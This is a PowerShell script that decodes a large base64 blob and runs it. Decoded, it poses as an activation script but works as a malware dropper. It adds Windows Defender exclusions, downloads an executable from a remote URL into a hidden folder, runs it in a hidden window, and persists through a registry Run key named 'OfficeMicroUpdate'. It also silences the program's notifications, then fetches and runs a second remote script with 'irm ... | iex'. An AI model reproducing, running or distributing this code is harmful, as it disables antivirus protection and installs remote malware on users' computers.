$base64EncodedString = "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpmdW5jdGlvbiBTaG93LUVycm9yTWVzc2FnZSB7CgogICAgcGFyYW0gKAoKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlLAoKICAgICAgICBbc3RyaW5nXSR0aXRsZSA9ICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyIKCiAgICApCgogICAgCgogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCRtZXNzYWdlLCAkdGl0bGUsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikKCn0KaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKGAKW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpIHsKICAgIFdyaXRlLVdhcm5pbmcgIkluc3VmZmljaWVudCBwcml2aWxlZ2VzIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQuIE9wZW4gYSBQb3dlclNoZWxsIGNvbnNvbGUgd2l0aCBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMgYW5kIHJ1biB0aGUgc2NyaXB0IGFnYWluLiIKICAgIFNob3ctRXJyb3JNZXNzYWdlIC1tZXNzYWdlICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyB0byBleGVjdXRlIHRoaXMgc2NyaXB0LiBPcGVuIGEgUG93ZXJTaGVsbCBjb25zb2xlIHdpdGggYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzIGFuZCBydW4gdGhlIHNjcmlwdCBhZ2Fpbi4iCkJyZWFrCn0KCgoKIyBCYXNlNjQtZW5jb2RlZCBzdHJpbmdzIGZvciB0aGlyZCBkb3dubG9hZCAob2ZmaWNlbWljcm8uZXhlKQokb2ZmaWNlRG93bmxvYWRVcmxCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoImh0dHBzOi8vZ2l0aHViLmNvbS9XaW5kb3dzVHdlYWtzWC9NaW5lclNlYXJjaC9yYXcvcmVmcy9oZWFkcy9tYWluL2RvbGJhZWIuZXhlIikpCiR1cGRhdGVycnJFeGVCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIldpbmRvd3NIb3N0QXBwbGljYXRpb24uZXhlIikpCiMgQ29tbW9uIGF0dHJpYnV0ZXMKJGhpZGRlbkF0dHJCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkhpZGRlbiIpKQokc2lsZW50bHlDb250aW51ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU2lsZW50bHlDb250aW51ZSIpKQokc3RvcEFjdGlvbkI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU3RvcCIpKQokZGlyZWN0b3J5QjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJEaXJlY3RvcnkiKSkKCiMgRGVjb2RlIHRoZW0KJG9mZmljZURvd25sb2FkVXJsID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkb2ZmaWNlRG93bmxvYWRVcmxCNjQpKQokdXBkYXRlcnJyRXhlID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkdXBkYXRlcnJyRXhlQjY0KSkKJGhpZGRlbkF0dHIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRoaWRkZW5BdHRyQjY0KSkKJHNpbGVudGx5Q29udGludWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzaWxlbnRseUNvbnRpbnVlQjY0KSkKJHN0b3BBY3Rpb24gPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzdG9wQWN0aW9uQjY0KSkKJGRpcmVjdG9yeSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGRpcmVjdG9yeUI2NCkpCgojIENyZWF0ZSBhIG5ldyBoaWRkZW4gZm9sZGVyQWRkLUZvbGRlckV4Y2x1c2lvbgokaGlkZGVuRm9sZGVyTmFtZSA9ICJOb3RpZnlUZW1wXyIgKyBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKS5TdWJzdHJpbmcoMCw4KQokaGlkZGVuRm9sZGVyID0gSm9pbi1QYXRoICRlbnY6TE9DQUxBUFBEQVRBICRoaWRkZW5Gb2xkZXJOYW1lCk5ldy1JdGVtIC1JdGVtVHlwZSAkZGlyZWN0b3J5IC1QYXRoICRoaWRkZW5Gb2xkZXIgLUZvcmNlIHwgT3V0LU51bGwKJG9mZmljZVBhdGggPSBKb2luLVBhdGggJGhpZGRlbkZvbGRlciAkdXBkYXRlcnJyRXhlCgojIEZ1bmN0aW9uIHRvIGFkZCBmb2xkZXIgZXhjbHVzaW9uCiMgRnVuY3Rpb24gdG8gYWRkIGV4Y2x1c2lvbnMgd2l0aCByZXRyeSBhbmQgdmVyaWZpY2F0aW9uCmZ1bmN0aW9uIEFkZC1Gb2xkZXJFeGNsdXNpb24gewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJHBhdGgsCiAgICAgICAgW2ludF0kbWF4UmV0cmllcyA9IDUsCiAgICAgICAgW2ludF0kZGVsYXlTZWNvbmRzID0gMQogICAgKQogICAgJHJldHJ5Q291bnQgPSAwCiAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgCiAgICB3aGlsZSAoLW5vdCAkc3VjY2VzcyAtYW5kICRyZXRyeUNvdW50IC1sdCAkbWF4UmV0cmllcykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHBhdGggLUVycm9yQWN0aW9uICRzdG9wQWN0aW9uCiAgICAgICAgICAgICMgVmVyaWZ5IGV4Y2x1c2lvbiB3YXMgYWRkZWQgKHJlcXVpcmVzIGFkbWluIHJpZ2h0cyB0byBjaGVjaywgYnV0IGF0dGVtcHQgYW55d2F5KQogICAgICAgICAgICBpZiAoR2V0LU1wUHJlZmVyZW5jZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEV4Y2x1c2lvblBhdGggfCBXaGVyZS1PYmplY3QgeyAkXyAtZXEgJHBhdGggfSkgewogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICRyZXRyeUNvdW50KysKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5U2Vjb25kcwogICAgICAgIH0KICAgIH0KICAgIGlmICgtbm90ICRzdWNjZXNzKSB7CiAgICB9CiAgICAjIEFkZGl0aW9uYWwgZGVsYXkgdG8gZW5zdXJlIGV4Y2x1c2lvbiB0YWtlcyBlZmZlY3QKICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMjAwCn0KCgojIE1haW4gZXhlY3V0aW9uCnRyeSB7CiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICJDOlxQcm9ncmFtIEZpbGVzIgogICAgV3JpdGUtSG9zdCAiTG9hZGluZyBBY3RpdmF0aW9uIFNjcmlwdC4uLiIgLUZvcmVncm91bmRDb2xvciBEYXJrR3JlZW4gLUJhY2tncm91bmRDb2xvciBXaGl0ZQogICAgIyBBZGQgZm9sZGVyIGV4Y2x1c2lvbiBCRUZPUkUgZG93bmxvYWRzCiAgICBBZGQtRm9sZGVyRXhjbHVzaW9uIC1wYXRoICRoaWRkZW5Gb2xkZXIKICAgICMgQWRkIGZpbGUtc3BlY2lmaWMgZXhjbHVzaW9ucyBmb3IgZXh0cmEgcHJvdGVjdGlvbgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkb2ZmaWNlUGF0aAogICAgCiAgICAKICAgICMgRG93bmxvYWQgb2ZmaWNlbWljcm8uZXhlIGFzIHVwZGF0ZXJyci5leGUKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJG9mZmljZURvd25sb2FkVXJsIC1PdXRGaWxlICRvZmZpY2VQYXRoIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uICRzdG9wQWN0aW9uCiAgICAjIFNldCBmb2xkZXIgYW5kIGZpbGVzIGFzIGhpZGRlbgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRvZmZpY2VQYXRoIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICAKICAgICMgUnVuIGFsbCBmaWxlcyBzaWxlbnRseSBpbiB0aGUgY3VycmVudCBzZXNzaW9uCiAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkb2ZmaWNlUGF0aCAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAKCiAgICAkcmVnUGF0aE9mZmljZSA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAkcmVnTmFtZU9mZmljZSA9ICJPZmZpY2VNaWNyb1VwZGF0ZSIKICAgICRyZWdWYWx1ZU9mZmljZSA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIGAiJG9mZmljZVBhdGhgIiIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGhPZmZpY2UgLU5hbWUgJHJlZ05hbWVPZmZpY2UgLVZhbHVlICRyZWdWYWx1ZU9mZmljZSAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgIyBTdXBwcmVzcyBub3RpZmljYXRpb25zIGZyb20gdXBkYXRlcnJyLmV4ZQogICAgTmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3MiIC1OYW1lICR1cGRhdGVycnJFeGUgLUZvcmNlIHwgT3V0LU51bGwKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcJHVwZGF0ZXJyckV4ZSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAwIC1FcnJvckFjdGlvbiAkc2lsZW50bHlDb250aW51ZQogICAgCiAgICAjIFdhaXQgYnJpZWZseSBmb3IgZXhlY3V0aW9uCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCn0gY2F0Y2ggewogICAgIyBPdXRwdXQgZXJyb3IgZm9yIGRlYnVnZ2luZwogICAgV3JpdGUtSG9zdCAiRXJyb3I6ICRfIgogICAgZXhpdCAxCn0gZmluYWxseSB7CiAgICAjIE5vIGNsZWFudXAgLSBsZWF2ZSB0cmFjZXMgYXMgcmVxdWVzdGVkCiAgICBpcm0gaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleAogICAgCn0K"
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
